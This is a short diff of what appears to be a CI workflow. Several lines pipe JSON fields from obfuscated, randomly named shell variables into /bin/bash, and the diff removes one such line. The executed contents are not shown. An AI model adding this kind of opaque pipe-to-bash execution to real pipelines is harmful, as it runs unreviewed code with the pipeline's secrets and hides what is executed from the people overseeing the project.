@@ -22,7 +22,6 @@ jobs:
           echo $uw18 | jq -r .rbh0 | /bin/bash
           printf '%s' "$u0" | jq -r .gw4 | /bin/bash
           echo $wekns30493 | jq -r .mbln7 | /bin/bash
-          echo $cxs0088 | jq -r .tq35413 | /bin/bash
 
       - name: Archive output
         if: always()
